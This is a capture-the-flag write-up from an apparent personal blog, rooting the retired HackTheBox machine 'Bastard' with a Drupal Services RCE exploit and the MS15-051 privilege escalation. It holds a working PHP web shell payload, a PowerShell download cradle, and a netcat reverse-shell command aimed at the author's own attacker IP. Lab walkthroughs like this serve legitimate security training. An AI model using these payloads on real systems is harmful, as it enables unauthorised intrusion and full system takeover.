---
layout: post
title: "Writeup: HackTheBox Bastard - NO Metasploit"
description: "Rooting Bastard without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
 This was my first Medium box on HackTheBox and took me about 4 hours to complete without Metasploit. I did get stuck on required modifications to the first Exploit-DB exploit and relied on [ippsec][] to get me over that bump.
 
# Bastard

_<small>Difficulty: Medium</small>_

_<small>Machine IP: 10.10.10.9</small>_

I start with a port scan and identify 3 open ports:

```bash
sudo nmap -sS -T4 -p- 10.10.10.9

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 15:03 EDT
Nmap scan report for 10.10.10.9
Host is up (0.015s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown
```

All top 20 UDP ports are filtered. Interrogating these 3 ports, I see 2 of them are RPC ports and 1 is a webserver.

```bash
sudo nmap -sS -T4 -A -sC -sV -p 80,135,49154 10.10.10.9

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 15:05 EDT
Nmap scan report for 10.10.10.9
Host is up (0.014s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)                                                      
No exact OS matches for host (test conditions non-ideal).                                                         
Network Distance: 2 hops                                                                                          
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                          
                                                                                                                  
TRACEROUTE (using port 80/tcp)                                                                                    
HOP RTT      ADDRESS                                                                                              
1   14.76 ms 10.10.14.1                                                                                           
2   14.78 ms 10.10.10.9
```

Let's dig into the webserver.

I begin enumerating the server with gobuster, however, I quickly realize the server delays every response by 10s so it will take forever. I shorten the wordlist I am using and increase gobuster's default timeout and let that run in the background while I manually traverse the server.

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.9 --timeout 15s -t 20
```

I curl the server and pick up some additional information about the software versions running on this web server.

```
Server: Microsoft-IIS/7.5
X-Powered-By: PHP/5.3.28
X-Generator: Drupal 7 (http://drupal.org)
X-Powered-By: ASP.NET
```

I take a look at what kind of exploits we have available for Drupal:

```bash
searchsploit drupal 7

-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Drupal 4.1/4.2 - Cross-Site Scripting                                           | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                   | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                     | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                   | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                         | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities          | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)               | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)     | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)     | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)        | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                          | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                              | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                         | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                           | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                   | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                               | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                               | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)        | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)     | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Met | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Met | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command  | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                  | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                              | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure               | php/webapps/44501.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Sc | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                 | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                   | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting         | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload  | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flots | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)               | php/remote/40130.rb
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

There are a lot of RCEs in there. I need some way to slim down the exploits to investigate.

I take a look at the paths that nmap extracted from the site's `robots.txt`:

```
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
```

In particular, I want to read `/CHANGELOG.txt` because that should give us a good idea of the exact Drupal version running on this machine.

The changelog informs us the latest update on the server was for Drupal 7.54.

Searching the web for "Drupal 7.54 exploits" returns an RCE exploit as the first result.

![Drupal web search RCE first result][drupal web search]

I skim this article but it's a lot of detail. I do notice, however, that the `Drupal 7.x Module Services - Remote Code Execution` exploit matches the article result from ambionics.com. I see from the comments at the top of the exploit that this refers to the same ambionics.com article:

```php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce
```

Reading through the exploit code, I see that it requires modification before we can use it. Specifically, the target hostname is hard-coded.

```php
$url = 'http://10.10.10.9/';
```

Additionally, at this point gobuster has partially progressed and identified a few directories, one of which is `/rest`. I had to modify the `endpoint_path` to this endpoint from the default in the script:

```php
$endpoint_path = '/rest';
```

I had some trouble executing my PHP payload and ended up copying the payload from [ippsec's excellent video walkthrough][ippsec video] of Bastard.

The modified snippet ended up looking like:

```php
$url = 'http://10.10.10.9/';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$phpCode = <<<'EOF'
<?php
  if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.19:8000/" . $_REQUEST['fupload']));
  };

  if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
  };
?>
EOF;

$file = [
    'filename' => 'bastard.php',
    'data' => $phpCode
];
```

This payload will allow me to upload files from my Kali machine using `python3 -m http.server` through the `fupload` query parameter and allow me to run RCE through the `fexec` parameter.

There were one or two other syntax errors in the original exploit that I had to fix when running it. Once those are resolved, running the exploit gives us:

```bash
php 41564.php 

Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9//bastard.php
```

Our payload was written to the webserver at `/bastard.php`. The exploit also generated two files, `session.json` and `user.json`.

The `user.json` file contains a password hash of the Drupal admin user. I don't crack that, however, as the `session.json` file provides me session information to construct a cookie to authenticate me as the admin user.

However, those are not what I want to focus on. Let's check if my RCE is now working:

![rce list directory contents][rce dir]

Great! I can run commands. What user am I running as?

```bash
curl http://10.10.10.9/bastard.php?fexec=whoami

nt authority\iusr
```

I am the web process, which makes sense. `nt authority\iusr` will not be in the Administrators group (and is not).

I also dump `systeminfo` to understand what system we're working with:

`http://10.10.10.9/bastard.php?fexec=systeminfo`

![rce systeminfo][]

The machine is a Windows 2008 R2 server with what appears to be 0 hotfixes installed. The specific OS version is `6.1.7600 N/A Build 7600`.

I do a bit of internet searching and find out that `6.1.7600 N/A Build 7600` is vulnerable to [MS15-051][]. It takes me some more time searching to find a compiled executable that I like. The `37049` Exploit-DB entry had executables that gave me trouble. I ended up on <https://github.com/jivoi/pentest/blob/master/exploit_win/ms15-051> which provided me the executable that I needed.

```bash
wget https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe
```

This exploit should escalate my local shell on the box to SYSTEM. I run it with a `whoami` test:

`http://10.10.10.9/bastard.php?fupload=ms15-051.exe&fexec=ms15-051%20whoami`

![rce root shell escalated][rce root]

Success!

Now I want to open up a reverse shell. I download the `nc64.exe` 64-bit netcat Windows executable located at <https://github.com/phackt/pentest/tree/master/privesc/windows> and upload it to the server with:

`http://10.10.10.9/bastard.php?fexec=echo (new-object System.Net.WebClient).Downloadfile('http://10.10.14.19:8000/nc.exe', 'nc.exe') | powershell -noprofile - `

The space after the `-` is important to keep in the exploit.

To be honest I forgot about `fupload` so I made things more complicated than I needed it to be.

However, from here I can open up a reverse shell with:

`http://10.10.10.9/bastard.php?fupload=ms15-051.exe&fexec=ms15-051%20%22nc64.exe%20-e%20cmd.exe%2010.10.14.19%204443%22`:

```bash
sudo nc -lvnp 4443

listening on [any] 4443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.9] 49176
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```

And proceed to collect my flags.

[hackthebox]: https://www.hackthebox.eu
[ippsec]: https://twitter.com/ippsec
[ippsec video]: https://www.youtube.com/watch?v=lP-E5vmZNC0&t=1
[ms15-051]: https://www.exploit-db.com/exploits/37049

[drupal web search]: /assets/img/htb/bastard/drupal-vulns.png
[rce dir]: /assets/img/htb/bastard/rce-dir.png
[rce root]: /assets/img/htb/bastard/rce-root-shell.png
[rce systeminfo]: /assets/img/htb/bastard/rce-systeminfo.png
